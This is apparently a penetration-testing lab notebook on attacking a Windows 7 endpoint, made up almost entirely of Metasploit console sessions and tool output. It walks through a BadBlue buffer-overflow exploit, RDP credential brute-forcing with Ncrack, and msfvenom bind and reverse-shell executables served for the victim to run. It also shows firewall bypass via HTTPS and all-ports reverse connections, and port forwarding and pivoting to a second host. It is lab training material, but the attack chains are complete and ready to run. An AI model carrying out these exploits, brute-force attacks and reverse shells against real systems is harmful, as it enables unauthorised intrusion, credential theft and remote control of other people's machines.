Windows Endpoint Pentesting

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

SoMware Based Vulnerabilites

https://www.exploit-db.com/exploits/16806/
BadBlue 2.72b

In Kali
msf > search Badblue
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                       Disclosure Date  Rank   Description
   ----                                       ---------------  ----   -----------
   exploit/windows/http/badblue_ext_overflow  2003-04-20       great  BadBlue 2.5 EXT.dll Buffer Overflow
   exploit/windows/http/badblue_passthru      2007-12-10       great  BadBlue 2.72b PassThru Buffer Overflow


msf > use exploit/windows/http/badblue_passthru
msf exploit(badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf exploit(badblue_passthru) > set RHOST 192.168.1.14
RHOST => 192.168.1.14
msf exploit(badblue_passthru) > exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.14:49242) at 2017-03-01 11:17:09 -0500

meterpreter > sysinfo
Computer        : ABCD-PC
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter > getuid
Server username: ABCD-PC\ABCD
meterpreter > getpid
Current pid: 2872
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x86   0
 280   4     smss.exe           x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 324   656   WmiPrvSE.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\wbem\wmiprvse.exe
 380   364   csrss.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 432   364   wininit.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 440   424   csrss.exe          x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 488   432   services.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 512   432   lsass.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 520   432   lsm.exe            x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 532   424   winlogon.exe       x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 656   488   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 724   488   vmacthlp.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmacthlp.exe
 740   488   dllhost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\dllhost.exe
 756   488   svchost.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 808   488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 896   488   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 972   488   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 1144  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1264  488   svchost.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 1360  488   spoolsv.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1396  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1456  488   msdtc.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 1508  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1600  488   VGAuthService.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1664  488   vmtoolsd.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1860  488   TPAutoConnSvc.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
 1940  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 2132  488   taskhost.exe       x86   1        ABCD-PC\ABCD                  C:\Windows\system32\taskhost.exe
 2204  896   dwm.exe            x86   1        ABCD-PC\ABCD                  C:\Windows\system32\Dwm.exe
 2228  2196  explorer.exe       x86   1        ABCD-PC\ABCD                  C:\Windows\Explorer.EXE
 2292  488   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2340  2228  vmtoolsd.exe       x86   1        ABCD-PC\ABCD                  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2704  440   conhost.exe        x86   1        ABCD-PC\ABCD                  C:\Windows\system32\conhost.exe
 2720  1860  TPAutoConnect.exe  x86   1        ABCD-PC\ABCD                  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 2728  440   conhost.exe        x86   1        ABCD-PC\ABCD                  C:\Windows\system32\conhost.exe
 2756  488   SearchIndexer.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
 2856  488   wmpnetwk.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Windows Media Player\wmpnetwk.exe
 2872  1840  badblue.exe        x86   1        ABCD-PC\ABCD                  C:\Program Files\BadBlue\EE\BadBlue.exe
 3168  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3468  2228  cmd.exe            x86   1        ABCD-PC\ABCD                  C:\Windows\system32\cmd.exe

meterpreter > migrate 2228
[*] Migrating from 2872 to 2228...
[*] Migration completed successfully.
meterpreter >

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

RDP Misconfiguration

In Windows 7
Enable RDP
Control Panel -> System and Security -> System -> Remote Settings -> Allow connections from computers running any version of Remote Desktop (less secure)

In Kali
$ nmap -sV -p3389 -n 192.168.1.14

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-03-01 11:20 EST
Nmap scan report for 192.168.1.14
Host is up (0.00042s latency).
PORT     STATE    SERVICE       VERSION
3389/tcp filtered ms-wbt-server
MAC Address: 00:0C:29:4D:B8:A9 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds

$ ncrack -U rdp_user_list -P rdp_pass_list -p rdp 192.168.1.14

Starting Ncrack 0.5 ( http://ncrack.org ) at 2017-03-01 11:23 EST

Discovered credentials for rdp on 192.168.1.14 3389/tcp:
192.168.1.14 3389/tcp rdp: 'ABCD' 'Ab12345'

Ncrack done: 1 service scanned in 6.00 seconds.

Ncrack finished.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Social Engineering

Bind Connect

In Kali
$ msfvenom -p windows/meterpreter_bind_tcp -a x86 -f exe > Bind_Payload.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 957999 bytes
Final size of exe file: 1033216 bytes
$ file Bind_Payload.exe
Bind_Payload.exe: PE32 executable (GUI) Intel 80386, for MS Windows
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.1.14 - - [01/Mar/2017 11:39:30] "GET / HTTP/1.1" 200 -
192.168.1.14 - - [01/Mar/2017 11:39:30] code 404, message File not found
192.168.1.14 - - [01/Mar/2017 11:39:30] "GET /favicon.ico HTTP/1.1" 404 -
192.168.1.14 - - [01/Mar/2017 11:39:30] code 404, message File not found
192.168.1.14 - - [01/Mar/2017 11:39:30] "GET /favicon.ico HTTP/1.1" 404 -
192.168.1.14 - - [01/Mar/2017 11:39:32] "GET /Bind_Payload.exe HTTP/1.1" 200 -

In Windows 7
In Browser
https://192.168.1.13:8000
Run Bind_Payload.exe
C:\Users\ABCD>netstat

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    127.0.0.1:49389        ABCD-PC:49390          ESTABLISHED
  TCP    127.0.0.1:49390        ABCD-PC:49389          ESTABLISHED
  TCP    192.168.1.14:4444      192.168.1.13:35761     ESTABLISHED

In Kali
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD => windows/meterpreter/bind_tcp
msf exploit(handler) > set RHOST 192.168.1.14
RHOST => 192.168.1.14
msf exploit(handler) > exploit

[*] Started bind handler
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:35761 -> 192.168.1.14:4444) at 2017-03-01 11:43:50 -0500

meterpreter > sysinfo
Computer        : ABCD-PC
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter >

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Bypass Firewall

Reverse Connect - Reliable

In Kali
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.13 -a x86 -f exe > Reverse_Payload.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Final size of exe file: 73802 bytes
$ file Reverse_Payload.exe
Reverse_Payload.exe: PE32 executable (GUI) Intel 80386, for MS Windows
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.1.14 - - [01/Mar/2017 11:56:54] "GET / HTTP/1.1" 200 -
192.168.1.14 - - [01/Mar/2017 11:56:54] code 404, message File not found
192.168.1.14 - - [01/Mar/2017 11:56:54] "GET /favicon.ico HTTP/1.1" 404 -
192.168.1.14 - - [01/Mar/2017 11:56:57] "GET /Reverse_Payload.exe HTTP/1.1" 200 -

In Windows 7
In Browser
http://192.168.1.13:8000/
Run Reverse_Payload.exe

In Kali
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > set LHOST 192.168.1.13
LHOST => 192.168.1.13
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.14:49248) at 2017-03-01 11:59:06 -0500

meterpreter > sysinfo
Computer        : ABCD-PC
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter >

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Bypass Firewall

Port 80 / 443 are open
Rest all are closed

https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication
HTTPS Tunneling
HTTP Tunneling

In Windows 7
Control Panel\System and Security\Windows Firewall
Advanced Settings -> Outbound Rules -> New Rule -> Port -> Next -> 4444 -> Block the connection -> Block Reverse TCP Payload -> Finish

In Kali
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_https
PAYLOAD => windows/meterpreter/reverse_https
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The local listener hostname
   LPORT     8443             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > set LHOST 192.168.1.13
LHOST => 192.168.1.13
msf exploit(handler) > exploit

[*] Started HTTPS reverse handler on https://192.168.1.13:8443
[*] Starting the payload handler...
[*] https://192.168.1.13:8443 handling request from 192.168.1.14; (UUID: ztzerbnw) Staging Native payload...
[*] Meterpreter session 1 opened (192.168.1.13:8443 -> 192.168.1.14:49186) at 2017-03-01 12:35:51 -0500

meterpreter > sysinfo
Computer        : ABCD-PC
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.1.14 - Meterpreter session 1 closed.  Reason: User exit
msf exploit(handler) >

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Automatic Outbound Open Port Detection

Unaware of the open ports on a windows machine
Solution
Payload that systematically tries to connect to each port from 1 - 65535 and connect back to the attacker

http://superuser.com/questions/440324/iptables-how-to-forward-all-external-ports-to-one-local-port

In Windows 7
Control Panel\System and Security\Windows Firewall
Advanced Settings -> Outbound Rules -> New Rule -> Port -> Next -> 4444-6009 -> Block the connection -> Block range of Ports -> Finish

In Kali
$ msfvenom -p windows/meterpreter/reverse_tcp_allports LHOST=192.168.1.13 LPORT=4444 -a x86 -f exe > Reverse_All.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 282 bytes
Final size of exe file: 73802 bytes
$ file Reverse_All.exe
Reverse_All.exe: PE32 executable (GUI) Intel 80386, for MS Windows
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.1.14 - - [01/Mar/2017 13:45:20] "GET / HTTP/1.1" 200 -
192.168.1.14 - - [01/Mar/2017 13:45:22] "GET /Reverse_All.exe HTTP/1.1" 200 -
$ iptables --flush
$ iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 4444:6010 -j DNAT --to-destination 192.168.1.13:4444

In Windows 7
In Browser
http://192.168.1.13:8000/
Run Reverse_All.exe

In Kali
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp_allports
PAYLOAD => windows/meterpreter/reverse_tcp_allports
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp_allports):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address
   LPORT     1                yes       The starting port number to connect back on


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > set LHOST 192.168.1.13
LHOST => 192.168.1.13
msf exploit(handler) > set LPORT 4444
LPORT => 4444
exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.14:49239) at 2017-03-01 13:46:49 -0500

meterpreter > sysinfo
Computer        : ABCD-PC
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter >

In Windows 7
$ netstat -an
Active Connections

  Proto  Local Address          Foreign Address        State
  <snip>
  TCP    192.168.1.14:139       0.0.0.0:0              LISTENING
  TCP    192.168.1.14:49239     192.168.1.13:6010      ESTABLISHED
  TCP    [::]:135               [::]:0                 LISTENING
  <snip>

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Port Forwarding

Attacker cannot directly access Metasploitable but has meterpreter session on Windows 7

Attacker ---- Firewall ---- Windows 7
                              |
                              |
                              |
                          Metasploitable

$ nmap -sV -n 192.168.1.14

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-03-01 14:12 EST
Nmap scan report for 192.168.1.14
Host is up (0.00050s latency).
Not shown: 991 filtered ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         BadBlue httpd 2.7
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
554/tcp   open  rtsp?
2869/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3389/tcp  open  tcpwrapped
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
10243/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
MAC Address: 00:0C:29:4D:B8:A9 (VMware)
Service Info: Host: ABCD-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.87 seconds

$ msf > search badblue
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                       Disclosure Date  Rank   Description
   ----                                       ---------------  ----   -----------
   exploit/windows/http/badblue_ext_overflow  2003-04-20       great  BadBlue 2.5 EXT.dll Buffer Overflow
   exploit/windows/http/badblue_passthru      2007-12-10       great  BadBlue 2.72b PassThru Buffer Overflow


msf > use exploit/windows/http/badblue_passthru
msf exploit(badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf exploit(badblue_passthru) > set RHOST 192.168.1.14
RHOST => 192.168.1.14
msf exploit(badblue_passthru) > exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.14:49181) at 2017-03-01 14:16:59 -0500

meterpreter > ps

Process List
============

 PID   PPID  Name                    Arch  Session  User          Path
 ---   ----  ----                    ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 296   512   dllhost.exe
 360   348   csrss.exe
 412   348   wininit.exe
 420   404   csrss.exe
 468   404   winlogon.exe
 512   412   services.exe
 520   412   lsass.exe
 528   412   lsm.exe
 636   512   svchost.exe
 696   512   vmacthlp.exe
 740   512   svchost.exe
 860   512   svchost.exe
 916   512   svchost.exe
 960   512   svchost.exe
 1016  860   audiodg.exe             x86   0
 1120  512   svchost.exe
 1252  512   svchost.exe
 1344  512   spoolsv.exe
 1380  512   svchost.exe
 1484  512   svchost.exe
 1512  512   svchost.exe
 1560  512   sppsvc.exe
 1660  512   VGAuthService.exe
 1684  512   vmtoolsd.exe
 1888  512   TPAutoConnSvc.exe
 1980  512   dllhost.exe
 2024  512   msdtc.exe
 2036  636   WmiPrvSE.exe
 2200  512   taskhost.exe            x86   1        ABCD-PC\ABCD  C:\Windows\system32\taskhost.exe
 2284  1888  TPAutoConnect.exe       x86   1        ABCD-PC\ABCD  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 2300  420   conhost.exe             x86   1        ABCD-PC\ABCD  C:\Windows\system32\conhost.exe
 2344  916   dwm.exe                 x86   1        ABCD-PC\ABCD  C:\Windows\system32\Dwm.exe
 2360  2328  explorer.exe            x86   1        ABCD-PC\ABCD  C:\Windows\Explorer.EXE
 2436  512   VSSVC.exe
 2500  2360  vmtoolsd.exe            x86   1        ABCD-PC\ABCD  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2744  512   SearchIndexer.exe
 2860  512   wmpnetwk.exe
 2976  2744  SearchProtocolHost.exe  x86   1        ABCD-PC\ABCD  C:\Windows\system32\SearchProtocolHost.exe
 2996  2744  SearchFilterHost.exe
 3044  2744  SearchProtocolHost.exe
 3156  512   svchost.exe
 3268  636   dllhost.exe             x86   1
 3296  636   WmiPrvSE.exe
 3500  512   svchost.exe
 3536  2360  badblue.exe             x86   1        ABCD-PC\ABCD  C:\Program Files\BadBlue\EE\badblue.exe
 3596  512   WmiApSrv.exe

meterpreter > migrate 2360
[*] Migrating from 3536 to 2360...
[*] Migration completed successfully.
meterpreter > ipconfig
-----------A new adaptor will be present here with a new IP-----------
Eg IP -> 112.112.112.10
meterpreter > run apr_scanner -r <IP_Address Range of the adaptor>
meterpreter > run apr_scanner -r 112.112.112.1-255
Inspect port 80 of metasploitable via Windows 7
meterpreter > portfwd add -l 8000 -p 80 -r 112.112.112.20
"112.112.112.20" new host enumerated using apr_scanner

$ nmap -sV -n -p 8000 localhost
In Browser
localhost:8000

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Pivoting

meterpreter > background
msf exploit(badblue_passthru) > search php_cgi_arg
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                      Disclosure Date  Rank       Description
   ----                                      ---------------  ----       -----------
   exploit/multi/http/php_cgi_arg_injection  2012-05-03       excellent  PHP CGI Argument Injection

msf exploit(badblue_passthru) > sessions -l
msf exploit(badblue_passthru) > route add 112.112.112.1 255.255 255.0 1
Where 1 is the session number and the IP is the gateway
msf exploit(badblue_passthru) > use exploit/multi/http/php_cgi_arg_injection
msf exploit(php_cgi_arg_injection) > show options

Module options (exploit/multi/http/php_cgi_arg_injection):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   PLESK        false            yes       Exploit Plesk
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                         yes       The target address
   RPORT        80               yes       The target port
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
   VHOST                         no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(php_cgi_arg_injection) > set RHOST 112.112.112.20
msf exploit(php_cgi_arg_injection) > set PAYLOAD php/meterpreter/bind_tcp
msf exploit(php_cgi_arg_injection) > exploit
meterpreter > sysinfo

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
